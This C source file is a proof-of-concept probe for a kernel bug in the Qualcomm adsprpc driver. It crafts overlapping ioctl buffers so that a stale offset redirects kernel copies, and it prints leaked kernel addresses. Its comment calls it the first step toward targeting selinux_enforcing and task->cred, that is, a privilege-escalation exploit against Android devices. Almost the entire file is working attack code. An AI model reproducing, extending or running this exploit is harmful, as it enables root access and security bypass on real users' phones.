#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/ioctl.h>

/* First, deliberately harmless, probe of the adsprpc stale-offset hole.
 *
 * The bug (adsprpc.c:702 vs :707-709): when one buffer is FULLY CONTAINED in another,
 * the code zeroes mstart/mend but leaves ->offset = max.end - start.  get_args then
 * computes mlen = mend - mstart = 0, so `VERIFY(err, rlen >= mlen)` (:1030) can never
 * fail, and the destination becomes `args - offset` (:1033) -- an address we set by
 * choosing the overlap geometry -- which copy_from_user then writes into (:1041-1043,
 * access_ok checked the SOURCE only).
 *
 * This program does NOT aim anywhere useful yet.  It keeps the displacement tiny
 * (offset = 16/64/256 bytes), so `args - offset` is still inside the driver's own
 * context buffer: worst case this invoke's own metadata is scrambled and the DSP
 * rejects it.  What we want back is the *read* side: put_args copies from the
 * kernel-side rpra[i].buf.pv into our out buffer, so an out buffer displaced by the
 * same trick shows us kernel memory near `args` -- the number needed to later aim at
 * selinux_enforcing / task->cred.  Nothing here can write outside that buffer.
 */
typedef struct { void *pv; ssize_t len; } remote_buf_t;
typedef union { remote_buf_t buf; uint32_t h; } remote_arg_t;
#define MAKE_SC(method, in, out) \
    (((uint32_t)(method) << 24) | (((uint32_t)(in) & 0xff) << 16) | (((uint32_t)(out) & 0xff) << 8))
#define IOCW(n, sz) (unsigned long)((3u << 30) | ((sz) << 16) | ((unsigned long)'R' << 8) | (n))
struct ioctl_invoke { uint32_t handle; uint32_t sc; remote_arg_t *pra; };
struct ioctl_init { uint32_t flags, pad; uintptr_t file; int32_t filelen, filefd;
                    uintptr_t mem; int32_t memlen, memfd; };

static void show(const char *tag, unsigned char *b, size_t n)
{
    size_t i;
    for (i = 0; i + 8 <= n; i += 8) {
        uint64_t v;
        memcpy(&v, b + i, 8);
        if (!v)
            continue;
        printf("    %s +%04zx = %016llx%s\n", tag, i, (unsigned long long)v,
               (v >> 40) == 0xffffffc0ULL || (v >> 40) == 0xffffff80ULL
               ? "   <== kernel VA" : "");
    }
}

int main(int argc, char **argv)
{
    static const size_t offs[] = { 16, 64, 256, 0x400 };
    unsigned char *page, *outbuf;
    struct ioctl_init in;
    struct ioctl_invoke iv;
    remote_arg_t pra[3];
    size_t a_len = 0x800;
    int fd, i, m, method = argc > 1 ? atoi(argv[1]) : 0;

    setvbuf(stdout, NULL, _IONBF, 0);
    page = mmap(NULL, 0x4000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    outbuf = mmap(NULL, 0x4000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    memset(page, 'A', 0x4000);
    memset(outbuf, 0, 0x4000);

    fd = open("/dev/adsprpc-smd", O_RDONLY);
    if (fd < 0) { perror("open"); return 2; }
    ioctl(fd, IOCW(5, 4), (unsigned long)0);
    memset(&in, 0, sizeof in);
    i = ioctl(fd, IOCW(6, sizeof in), &in);
    printf("INIT rc=%d errno=%d\n", i, i ? errno : 0);

    /* baseline: does the (in=2, out=1) shape even get accepted by the DSP? no overlap */
    memset(pra, 0, sizeof pra);
    pra[0].buf.pv = page;            pra[0].buf.len = 0x10;
    pra[1].buf.pv = page + 0x1000;   pra[1].buf.len = 0x10;
    pra[2].buf.pv = outbuf;          pra[2].buf.len = 0x100;
    memset(&iv, 0, sizeof iv);
    iv.handle = 1;
    iv.sc = MAKE_SC(method, 2, 1);
    iv.pra = pra;
    errno = 0;
    i = ioctl(fd, IOCW(1, sizeof iv), &iv);
    printf("baseline (in=2,out=1, no overlap) method=%d rc=%d errno=%d\n", method, i, errno);
    show("baseline-out", outbuf, 0x100);

    for (m = 0; m < (int)(sizeof offs / sizeof offs[0]); m++) {
        size_t off = offs[m];
        /* A = [page, page+a_len); B = [page+a_len-off, +0x10)  =>  B.end == A.end
         * => contained branch => offset = max.end - B.start = off, mlen = 0 */
        memset(outbuf, 0, 0x1000);
        /* A = [page, page+a_len).  Put B's user address so that
         * offset = A.end - B.start == off  while B stays inside A's range. */

        /* (in=1, out=1) is the shape the DSP actually accepts for handle 1/method 0
         * (measured rc=0), so the containment is built between the IN buffer and the
         * OUT buffer: overps[] covers inbufs+outbufs, hence the out buffer can be the
         * "contained" one.  Then rpra[out].buf.pv = args - offset and put_args() copies
         * from there into our page => a READ of the kernel context buffer, with no write
         * outside it at all. */
        memset(pra, 0, sizeof pra);
        pra[0].buf.pv = page;                       /* in  */
        pra[0].buf.len = (ssize_t)a_len;
        pra[1].buf.pv = (void *)(page + a_len - off);   /* contained: offset = A.end - B.start = off */
        pra[1].buf.len = 0x200;
        memcpy(&pra[1].buf.pv, &pra[1].buf.pv, 8);
        iv.sc = MAKE_SC(method, 1, 1);
        iv.pra = pra;
        errno = 0;
        i = ioctl(fd, IOCW(1, sizeof iv), &iv);
        printf("overlap off=0x%zx rc=%d errno=%d (%s)\n", off, i, errno, strerror(errno));
        show("out", outbuf, 0x200);
    }
    close(fd);
    return 0;
}
